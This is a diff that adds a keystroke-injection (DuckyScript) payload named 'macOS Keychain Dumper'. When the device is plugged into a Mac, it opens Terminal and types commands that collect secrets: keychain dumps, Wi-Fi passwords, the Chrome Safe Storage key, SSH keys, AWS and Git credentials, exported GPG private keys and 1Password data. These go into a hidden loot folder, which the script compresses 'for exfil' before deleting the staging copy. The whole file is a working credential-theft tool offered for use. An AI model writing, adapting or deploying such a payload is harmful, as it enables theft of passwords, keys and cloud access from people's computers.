@@ -1,0 +1,83 @@
+REM =============================================
+REM Title: macOS Keychain Dumper
+REM Author: bad-antics
+REM Description: Extract secrets from macOS Keychain
+REM Category: nullsec/exfil
+REM Target: macOS 12+
+REM =============================================
+
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Create loot directory
+STRING mkdir -p /tmp/.loot && cd /tmp/.loot
+ENTER
+DELAY 200
+
+REM Dump generic passwords (will prompt for keychain password)
+STRING security dump-keychain -d login.keychain 2>/dev/null | grep -A 5 "keychain" > keychain_dump.txt
+ENTER
+DELAY 500
+
+REM Find stored WiFi passwords
+STRING security find-generic-password -ga "AirPort" 2>&1 | grep password > wifi_passwords.txt
+ENTER
+DELAY 300
+
+REM List all internet passwords
+STRING security dump-keychain login.keychain 2>/dev/null | grep -E "svce|acct|srvr" > internet_passwords.txt
+ENTER
+DELAY 300
+
+REM Chrome safe storage key
+STRING security find-generic-password -ga "Chrome Safe Storage" 2>&1 > chrome_key.txt
+ENTER
+DELAY 200
+
+REM Safari passwords location
+STRING ls -la ~/Library/Keychains/ > keychain_files.txt
+ENTER
+DELAY 200
+
+REM SSH keys
+STRING cp -r ~/.ssh /tmp/.loot/ssh_keys 2>/dev/null
+ENTER
+DELAY 200
+
+REM AWS credentials
+STRING cp ~/.aws/credentials /tmp/.loot/aws_creds.txt 2>/dev/null
+ENTER
+DELAY 200
+
+REM Git credentials
+STRING cp ~/.git-credentials /tmp/.loot/git_creds.txt 2>/dev/null
+ENTER
+DELAY 200
+
+REM GPG keys
+STRING gpg --export-secret-keys --armor > /tmp/.loot/gpg_private.asc 2>/dev/null
+ENTER
+DELAY 300
+
+REM 1Password CLI token
+STRING cp ~/Library/Group\ Containers/*.onepassword/Library/Application\ Support/1Password/Data/*.sqlite /tmp/.loot/ 2>/dev/null
+ENTER
+DELAY 200
+
+REM Compress and encode for exfil
+STRING tar czf /tmp/k_$(hostname).tar.gz /tmp/.loot 2>/dev/null
+ENTER
+DELAY 300
+
+REM Cleanup
+STRING rm -rf /tmp/.loot
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
